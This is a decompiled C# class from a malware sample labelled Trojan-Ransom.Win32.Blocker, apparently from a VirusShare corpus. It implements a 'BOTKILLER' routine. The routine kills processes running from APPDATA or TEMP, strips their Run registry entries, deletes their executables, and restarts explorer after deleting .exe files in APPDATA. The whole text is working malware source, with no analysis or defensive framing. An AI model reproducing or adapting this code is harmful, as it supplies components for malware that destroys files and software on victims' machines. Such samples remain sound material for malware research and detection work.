// Decompiled with JetBrains decompiler
// Type: insomnia.Class28
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;

namespace insomnia
{
  internal class Class28
  {
    public static string[] Field1 = Class33.Method2();

    public static void Method5()
    {
      foreach (Process process in Process.GetProcesses())
      {
        try
        {
          if (!process.MainModule.FileName.Contains(Environment.GetEnvironmentVariable("APPDATA")))
          {
            if (!process.MainModule.FileName.Contains(Environment.GetEnvironmentVariable("TEMP")))
              continue;
          }
          if (!process.ProcessName.Contains(Class26.Field21))
            Class28.Method4(process.ProcessName, process.MainModule.FileName);
        }
        catch
        {
        }
      }
    }

    public static void Method4(string A_0, string A_1)
    {
      Class28.Method3(A_0, A_1);
      Class28.Method2(A_0, A_1);
    }

    public static void Method3(string A_0, string A_1)
    {
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
        foreach (string valueName in registryKey.GetValueNames())
        {
          if (registryKey.GetValue(valueName).ToString().Contains(A_1) && valueName != Class26.Field5)
          {
            Class31.Method3("[BOTKILLER]: Removing registry key -> (HKCU\\" + valueName + ")", Class26.Field4);
            Class39.Method3("HKCU", valueName);
          }
        }
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
        foreach (string valueName in registryKey.GetValueNames())
        {
          if (registryKey.GetValue(valueName).ToString().Contains(A_1) && valueName != Class26.Field5)
          {
            Class31.Method3("[BOTKILLER]: Removing registry key -> (HKLM\\" + valueName + ")", Class26.Field4);
            Class39.Method3("HKLM", valueName);
          }
        }
      }
      catch
      {
      }
    }

    public static void Method2(string A_0, string A_1)
    {
      try
      {
        foreach (Process process in Process.GetProcessesByName(A_0))
        {
          if ((A_0 != "Dropbox" || A_0 != "chrome") && !Class26.Field20.Contains(A_0))
          {
            foreach (string input in Class28.Field1)
            {
              if (input.Contains("TCP"))
              {
                string[] strArray = Regex.Split(input, "\\s+");
                if (Process.GetProcessById(Convert.ToInt32(strArray[5])).ProcessName == process.ProcessName)
                  Class31.Method3("[BOTKILLER]: Found outgoing connection from " + process.ProcessName + " -> " + strArray[3], Class26.Field4);
              }
            }
            process.Kill();
            process.WaitForExit();
            File.SetAttributes(A_1, FileAttributes.Normal);
            File.Delete(A_1);
            Class31.Method3("[BOTKILLER]: Removed file [path='" + A_1 + "']", Class26.Field4);
            Thread.Sleep(200);
          }
        }
      }
      catch
      {
      }
    }

    public static void Method1()
    {
      foreach (Process process in Process.GetProcessesByName("explorer"))
      {
        try
        {
          process.Kill();
          process.WaitForExit();
        }
        catch
        {
        }
      }
      foreach (Process process in Process.GetProcessesByName("iexplore"))
      {
        try
        {
          process.Kill();
          process.WaitForExit();
        }
        catch
        {
        }
      }
      try
      {
        foreach (string file in Directory.GetFiles(Environment.GetEnvironmentVariable("APPDATA"), "*.exe"))
        {
          string str = file;
          file.Substring(0, file.Length - 4);
          string A_0 = file.Substring(0, str.Length);
          if (!file.Contains("Dropbox") || !file.Contains("chrome"))
          {
            File.Delete(str);
            Class28.Method3(A_0, str);
            Class31.Method3("[BOTKILLER]: Removed file [path='" + str + "']", Class26.Field4);
          }
          Thread.Sleep(200);
        }
        Process.Start("explorer.exe");
      }
      catch
      {
        Process.Start("explorer.exe");
      }
    }
  }
}
